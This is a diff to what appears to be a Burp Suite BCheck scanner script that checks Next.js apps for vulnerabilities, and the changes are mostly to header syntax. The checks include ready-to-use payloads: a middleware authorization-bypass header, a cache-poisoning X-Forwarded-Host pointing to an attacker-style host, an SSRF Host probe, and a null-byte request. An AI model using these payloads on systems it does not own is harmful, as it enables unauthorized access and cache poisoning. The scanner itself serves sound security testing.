@@ -24,7 +24,7 @@ given request then
   send request called mw_bypass {
     replacing path: {protected_path}
     replacing method: "GET"
-    adding header called "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
+    adding header "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
   }
 
   if {mw_bypass.response.status_code} is "200" then
@@ -51,8 +51,8 @@ given request then
   send request called cache_poison {
     replacing path: {cache_path}
     replacing method: "GET"
-    adding header called "X-Forwarded-Host": "evil.attacker.com"
-    adding header called "X-Forwarded-Scheme": "https"
+    adding header "X-Forwarded-Host": "evil.attacker.com"
+    adding header "X-Forwarded-Scheme": "https"
   }
 
   if {cache_poison.response.status_code} is "200" and
@@ -82,7 +82,7 @@ given request then
   send request called ssrf_check {
     replacing path: {action_path}
     replacing method: "POST"
-    adding header called "Host": "YOUR_BURP_COLLABORATOR_HOST"
+    adding header "Host": "YOUR_BURP_COLLABORATOR_HOST"
     replacing body: ""
   }
 
@@ -112,7 +112,7 @@ given request then
     report issue:
       severity: medium
       confidence: firm
-      detail: "CVE-2023-46298: Next.js image optimizer returned 500/503 on null byte URL param. DoS likely."
+      detail: "CVE-2023-46298: Next.js image optimizer returned 500/503 on null byte URL param."
       remediation: "Upgrade Next.js to 13.4.1 or later."
   end if
 
